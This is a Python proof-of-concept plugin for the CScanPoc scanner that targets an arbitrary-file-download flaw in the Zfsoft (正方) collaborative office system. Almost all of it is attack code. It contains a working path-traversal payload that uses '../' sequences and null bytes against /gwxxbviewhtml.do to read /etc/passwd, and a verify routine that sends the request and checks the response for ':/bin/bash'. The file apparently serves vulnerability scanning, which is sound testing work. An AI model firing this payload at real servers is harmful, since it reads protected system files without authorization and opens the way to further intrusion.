# coding: utf-8
import re

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Zfsoft_0101' # 平台漏洞编号，留空
    name = '正方协同办公系统 任意文件下载' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.FILE_TRAVERSAL # 漏洞类型
    disclosure_date = '2015-12-23'  # 漏洞公布时间
    desc = '''
        正方协同办公系统
        /gwxxbviewhtml.do?theAction=downdoc&gw_title=%00&htwj_recordid=../../../../../../../../../../.././../etc/passwd%00 任意文件下载漏洞。
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=150337
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown' #cve编号
    product = '正方协同办公系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5f4b49ff-7000-4844-bc19-85f165d266c1' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-5-25' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/gwxxbviewhtml.do?theAction=downdoc&gw_title=%00&htwj_recordid=../../../../../../../../../../.././../etc/passwd%00'
            verify_url = self.target + payload 

            code, head, res, errcode, _ = hh.http(verify_url)
            if  code == 200 and ':/bin/bash' in res:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()

if __name__ == '__main__':
    Poc().run()